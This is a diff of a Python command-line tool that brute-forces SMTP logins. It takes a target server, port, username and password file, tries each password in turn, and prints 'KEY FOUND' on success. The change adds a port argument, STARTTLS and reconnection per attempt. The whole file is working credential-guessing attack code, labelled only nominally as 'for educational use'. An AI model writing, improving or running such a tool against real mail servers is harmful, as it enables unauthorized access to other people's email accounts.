@@ -1,58 +1,54 @@
 import smtplib
 import argparse
-from time import sleep
+import time
 
-def smtp_bruteforce(target, username, password_list):
-    """
-    Attempts to brute force an SMTP login using a password list.
-    
-    :param target: SMTP server URL (example: smtp.example.com)
-    :param username: The username to brute force
-    :param password_list: Path to the password list
-    """
-    print(f"Starting brute force attack on {target} with username {username}...")
-    
-    # Open the password list file
-    with open(password_list, 'r') as f:
-        passwords = f.readlines()
-        
-    # Connect to the SMTP server
-    try:
-        smtp_server = smtplib.SMTP(target)
-        smtp_server.set_debuglevel(0)  # Set to 0 to suppress debug output
-        smtp_server.ehlo()
-    except Exception as e:
-        print(f"Could not connect to {target}: {e}")
-        return
-    
-    # Loop through each password in the list
-    for password in passwords:
-        password = password.strip()
+def smtp_bruteforce(host, port, username, password_list):
+    for password in password_list:
         try:
-            # Try to login with the current password
-            smtp_server.login(username, password)
-            print(f"KEY FOUND: [{password}]")
-            break
-        except smtplib.SMTPAuthenticationError:
-            print(f"Failed with password: {password}")
-        except Exception as e:
-            print(f"Error during authentication: {e}")
-        
-        sleep(1)  # Sleep between attempts to avoid overwhelming the server
+            # Connect to the SMTP server
+            server = smtplib.SMTP(host, port, timeout=10)
+            server.set_debuglevel(0)  # Set debug level to 0 for clean output
+            server.starttls()  # Start TLS encryption
 
-    # Close the SMTP connection
-    smtp_server.quit()
+            # Try to log in with the username and password
+            server.login(username, password)
+            print(f"KEY FOUND [{password}]")
+            server.quit()  # Close the connection
+            return True  # Password found, exit function
+
+        except smtplib.SMTPAuthenticationError:
+            # If authentication fails, continue with the next password
+            print(f"Failed login for {password}")
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+
+        time.sleep(1)  # Add a slight delay between attempts to avoid rate limiting
+
+    print("KEY NOT FOUND")
+    return False  # No password found
 
 def main():
-    parser = argparse.ArgumentParser(description="SMTP Brute Force Tool")
-    parser.add_argument("-l", "--login", required=True, help="Username for the SMTP login")
+    # Set up command-line argument parsing
+    parser = argparse.ArgumentParser(description="SMTP Brute Forcer (For educational use only)")
+    parser.add_argument("-l", "--username", required=True, help="Target username (email address)")
     parser.add_argument("-P", "--passwordlist", required=True, help="Path to the password list file")
-    parser.add_argument("url", help="The target SMTP server (e.g., smtp.example.com)")
+    parser.add_argument("host", help="Target SMTP server (e.g., smtp.example.com)")
+    parser.add_argument("port", type=int, help="SMTP server port (usually 25, 465, or 587)")
 
+    # Parse arguments
     args = parser.parse_args()
 
-    # Run the brute force attack with the provided arguments
-    smtp_bruteforce(args.url, args.login, args.passwordlist)
+    # Read password list from file
+    try:
+        with open(args.passwordlist, "r") as f:
+            password_list = [line.strip() for line in f.readlines()]
+    except FileNotFoundError:
+        print(f"Error: Password list file '{args.passwordlist}' not found.")
+        return
+
+    # Run the brute force function
+    smtp_bruteforce(args.host, args.port, args.username, password_list)
 
 if __name__ == "__main__":
     main()
